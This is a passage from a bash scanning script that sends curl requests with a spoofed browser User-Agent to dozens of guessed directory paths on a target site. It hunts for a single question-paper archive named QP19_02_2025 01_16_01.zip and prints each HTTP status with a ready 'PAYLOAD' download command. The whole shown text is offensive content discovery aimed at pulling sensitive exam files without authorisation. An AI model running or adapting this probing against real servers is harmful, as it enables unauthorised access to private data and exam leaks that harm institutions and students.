${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandler_DatabaseManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandler_DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandler_DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaper_Workflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaper_Workflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaper_Workflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchUpload_QPMaster/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchUpload_QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchUpload_QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchProcessor_Q_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchProcessor_Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchProcessor_Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPPortal/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPPortal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPPortal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Platform-QsnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Platform-QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Platform-QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileUploadQP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileUploadQP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileUploadQP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessing-Upload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessing-Upload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessing-Upload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitorTool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitorTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitorTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandler-ProcessingSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandler-ProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandler-ProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabase_Dashboard/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabase_Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabase_Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPB_Uploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPB_Uploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPB_Uploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Mgmt_QPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Mgmt_QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Mgmt_QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloudProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloudProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloudProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Automation_TestPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Automation_TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Automation_TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Sync_QPUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Sync_QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Sync_QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulk-Suite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulk-Suite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulk-Suite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [CloudSync-QPService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}CloudSync-QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}CloudSync-QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploadBulkUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploadBulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploadBulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloud-DataPipeline/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloud-DataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloud-DataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Manager-QPMonitor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Manager-QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Manager-QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataSyncQPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataSyncQPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataSyncQPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploader-Mgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploader-Mgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploader-Mgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAuto_MonitoringTool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAuto_MonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAuto_MonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaper_Platform/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaper_Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaper_Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaper_Module/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaper_Module/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaper_Module/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingModuleQPAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingModuleQPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingModuleQPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploaderHandlingModule/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploaderHandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploaderHandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_P-Processing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_P-Processing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_P-Processing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringQPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringQPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringQPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Panel_QP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Panel_QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Panel_QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Monitoring-QP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Monitoring-QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Monitoring-QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper-BulkUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaper-BulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper-BulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataProcessing-QPAuto/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataProcessing-QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataProcessing-QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploader_Portal/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploader_Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploader_Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmt-Management/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmt-Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmt-Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBPanel/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBPanel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBPanel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystem-BatchUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystem-BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystem-BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatch-Uploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatch-Uploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
